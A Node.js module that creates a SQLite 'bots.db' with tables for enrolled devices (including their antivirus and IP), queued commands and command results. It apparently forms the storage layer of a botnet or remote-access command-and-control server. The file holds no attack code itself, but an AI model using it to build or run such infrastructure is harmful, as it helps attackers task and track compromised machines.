const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const dbPath = path.join(__dirname, 'bots.db');
const db = new sqlite3.Database(dbPath);

// Promisify run, get, all
db.runAsync = (sql, params = []) =>
  new Promise((resolve, reject) => {
    db.run(sql, params, function (err) {
      if (err) return reject(err);
      resolve({ lastID: this.lastID, changes: this.changes });
    });
  });

db.getAsync = (sql, params = []) =>
  new Promise((resolve, reject) => {
    db.get(sql, params, (err, row) => {
      if (err) return reject(err);
      resolve(row);
    });
  });

db.allAsync = (sql, params = []) =>
  new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => {
      if (err) return reject(err);
      resolve(rows);
    });
  });

// Create tables if they don't exist
const init = async () => {
  await db.runAsync(`
    CREATE TABLE IF NOT EXISTS devices (
      device_id TEXT PRIMARY KEY,
      hostname TEXT,
      os TEXT,
      arch TEXT,
      av TEXT,
      first_seen INTEGER,
      last_seen INTEGER,
      ip TEXT
    )
  `);

  await db.runAsync(`
    CREATE TABLE IF NOT EXISTS commands (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT,
      command TEXT,
      status TEXT DEFAULT 'pending',
      created_at INTEGER,
      delivered_at INTEGER,
      completed_at INTEGER
    )
  `);

  await db.runAsync(`
    CREATE TABLE IF NOT EXISTS results (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device_id TEXT,
      command TEXT,
      output TEXT,
      created_at INTEGER
    )
  `);
};

init().catch(err => {
  console.error('Database init error:', err);
  process.exit(1);
});

// Export the db object with helper methods
module.exports = {
  run: (sql, params) => db.runAsync(sql, params),
  get: (sql, params) => db.getAsync(sql, params),
  all: (sql, params) => db.allAsync(sql, params),
};
